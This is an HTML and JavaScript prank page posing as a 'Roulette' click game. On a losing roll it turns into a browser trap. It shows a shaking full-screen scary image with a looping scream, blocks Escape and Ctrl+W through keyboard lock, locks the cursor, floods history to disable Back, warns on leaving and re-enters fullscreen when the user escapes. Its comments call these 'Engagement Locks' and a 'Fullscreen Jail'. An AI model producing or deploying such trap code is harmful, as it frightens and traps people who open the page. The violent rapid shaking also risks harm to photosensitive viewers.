<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roulette</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: black; overflow: hidden; font-family: 'Courier New', monospace;
            display: flex; justify-content: center; align-items: center;
            color: white;
        }
        #game-ui { text-align: center; z-index: 5; }
        #scary-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('./scary.gif');
            background-size: cover; background-position: center;
            display: none; z-index: 1000;
        }
        button {
            padding: 20px 40px; font-size: 24px; cursor: pointer;
            background: #111; color: #cc0000; border: 2px solid #cc0000;
            text-transform: uppercase; font-weight: bold; margin-top: 20px;
        }
        button:hover { background: #cc0000; color: white; }
        #status { font-size: 18px; margin-bottom: 10px; color: #888; }
        #shaker { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
    </style>
</head>
<body>

    <div id="game-ui">
        <div id="status">Spinning... 1 Bullet.</div>
        <button id="trigger-btn">Spin & Pull Trigger</button>
    </div>

    <div id="scary-screen"></div>

    <!-- Audio source changed to scream.mp3 -->
    <audio id="scream-audio" loop preload="auto"><source src="./scream.mp3"></audio>

    <script>
        const triggerBtn = document.getElementById('trigger-btn');
        const status = document.getElementById('status');
        const scaryScreen = document.getElementById('scary-screen');
        const scream = document.getElementById('scream-audio');

        triggerBtn.addEventListener('click', () => {
            // "Spinning" logic: 1-in-6 chance on every single click
            const bullet = Math.floor(Math.random() * 6) + 1;
            const currentPull = Math.floor(Math.random() * 6) + 1;

            if (currentPull === bullet) {
                lose();
            } else {
                status.innerText = "Click... Chamber spun and survived.";
            }
        });

        async function lose() {
            scaryScreen.style.display = 'block';
            document.getElementById('game-ui').style.display = 'none';

            // Start Scream Loop
            scream.play().catch(() => {});

            // Engagement Locks
            const elem = document.documentElement;
            try {
                if (elem.requestFullscreen) await elem.requestFullscreen();
                
                // Blocks Esc and Ctrl+W (Chrome/Edge Only)
                if (navigator.keyboard && navigator.keyboard.lock) {
                    await navigator.keyboard.lock(["Escape", "KeyW"]);
                }

                // Traps and hides cursor
                if (elem.requestPointerLock) elem.requestPointerLock();
            } catch (err) {}

            activateTraps();
        }

        function activateTraps() {
            // Anti-Exit History Flood
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => window.history.go(1);
            setInterval(() => window.history.pushState(null, "", window.location.href), 100);

            // Tab Visibility Title Change
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) document.title = "DON'T LEAVE";
            });

            // Native Browser Leave Warning
            window.onbeforeunload = (e) => {
                e.preventDefault();
                e.returnValue = '';
            };

            // Violent Shaking of the Scary GIF
            setInterval(() => {
                const x = (Math.random() - 0.5) * 35;
                const y = (Math.random() - 0.5) * 35;
                scaryScreen.style.transform = `translate(${x}px, ${y}px)`;
            }, 25);

            // Fullscreen Jail: If they escape, click to re-lock
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) {
                    scaryScreen.onclick = () => lose();
                }
            });
        }
    </script>
</body>
</html>
